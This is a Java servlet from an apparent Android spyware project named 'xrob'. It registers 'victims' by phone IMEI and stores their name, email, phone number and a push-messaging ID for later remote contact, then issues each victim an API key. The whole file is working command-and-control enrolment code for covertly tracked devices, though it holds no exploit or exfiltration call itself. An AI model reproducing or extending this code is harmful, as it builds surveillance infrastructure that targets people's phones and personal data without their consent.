package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Clients;
import com.theah64.xrob.api.database.tables.Victims;
import com.theah64.xrob.api.models.Victim;
import com.theah64.xrob.api.utils.APIResponse;
import com.theah64.xrob.api.utils.JSONUtils;
import com.theah64.xrob.api.utils.RandomString;
import com.theah64.xrob.api.utils.Request;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Random;

/**
 * Used to create new victim
 * Needed params
 * 1) Name
 * 2) Imei
 * 3) FCM ID - Optional
 */
@WebServlet(name = "IN Servlet", urlPatterns = {BaseServlet.VERSION_CODE + "/in"})
public class INServlet extends BaseServlet {

    private static final String[] requiredParams = {Victims.COLUMN_IMEI};
    private static final int API_KEY_LENGTH = 10;

    protected void doPost(HttpServletRequest servletRequest, HttpServletResponse servletResponse) throws ServletException, IOException {
        servletResponse.setContentType(CONTENT_TYPE_JSON);

        //Preparing writer
        final PrintWriter out = servletResponse.getWriter();

        try {

            final Request request = new Request(servletRequest, requiredParams);

            final String imei = request.getStringParameter(Victims.COLUMN_IMEI);
            final Victims victimsTable = Victims.getInstance();
            final Victim oldVictim = victimsTable.get(Victims.COLUMN_IMEI, imei);

            final String apiKey;

            //Victim doesn't exists, so create new account
            final String name = request.getStringParameter(Victims.COLUMN_NAME);
            final String email = request.getStringParameter(Victims.COLUMN_EMAIL);
            final String phone = request.getStringParameter(Victims.COLUMN_PHONE);

            //FCM ID may be null
            String fcmId = request.getStringParameter(Victims.COLUMN_FCM_ID);

            if (fcmId != null && fcmId.isEmpty()) {
                fcmId = null;
            }

            if (oldVictim == null) {

                //Preparing new api key for new victim
                apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);

                final Victim newVictim = new Victim(name, phone, email, imei, apiKey, fcmId, null);

                victimsTable.addv2(newVictim);

            } else {

                //Setting new values to old victim.
                if (isUpdateFeasible(oldVictim.getFCMId(), fcmId)) {
                    victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_FCM_ID, fcmId);
                }

                if (isUpdateFeasible(oldVictim.getName(), name)) {
                    victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_NAME, name);
                }

                if (isUpdateFeasible(oldVictim.getEmail(), email)) {
                    victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_EMAIL, email);
                }

                if (isUpdateFeasible(oldVictim.getPhone(), phone)) {
                    victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_PHONE, phone);
                }


                //Old victim!
                apiKey = oldVictim.getApiKey();
            }


            //Finally
            out.write(new APIResponse("success", Victims.COLUMN_API_KEY, apiKey).getResponse());

        } catch (Exception e) {
            out.write(new APIResponse(1, e.getMessage()).getResponse());
        }


        //Closing writer
        out.flush();
        out.close();

    }

    private static boolean isUpdateFeasible(final String oldValue, String newValue) {
        return (newValue != null && !newValue.isEmpty() && ((oldValue != null && !oldValue.equals(newValue)) || oldValue == null));
    }

    //GET METHOD NOT SUPPORTED ###
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        setGETMethodNotSupported(response);
    }


}
